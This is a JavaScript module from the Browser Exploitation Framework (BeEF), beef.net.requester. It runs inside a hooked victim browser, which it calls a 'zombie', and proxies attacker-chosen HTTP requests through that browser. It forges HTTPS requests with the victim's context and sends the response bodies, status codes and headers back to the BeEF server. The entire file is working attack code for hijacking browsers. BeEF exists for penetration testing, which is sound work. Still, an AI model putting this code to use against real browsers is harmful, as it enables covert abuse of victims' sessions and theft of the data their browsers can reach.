//
// Copyright (c) 2006-2012 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.requester
 * 
 * request object structure:
 * + method: {String} HTTP method to use (GET or POST).
 * + host: {String} hostname
 * + query_string: {String} The query string is a part of the URL which is passed to the program.
 * + uri: {String} The URI syntax consists of a URI scheme name.
 * + headers: {Array} contain the operating parameters of the HTTP request. 
 */
beef.net.requester = {
	
	handler: "requester",
	
	//This function makes the request the proxy sends to the zombie
	send: function(requests_array) {

        for (i in requests_array) {
            request = requests_array[i];
	    
	    if(!request.host || ! request.uri) //for some reason sometimes this 2 are undefined
		continue;
	    
	   request.uri = request.uri.replace("http","https");
	   beef.net.forge_request('https', request.method, request.host, 443, request.uri, null, request.headers, request.data, 10, null, request.allowCrossDomain, request.id,
                                       function(res, requestid) { beef.net.send('/requester', requestid, {
                                           response_data: res.response_body,
                                           response_status_code: res.status_code,
                                           response_status_text: res.status_text,
					                       response_port_status: res.port_status,
                                           response_headers: res.headers});
                                       }
                                 );


        }
    }
};

beef.regCmp('beef.net.requester');
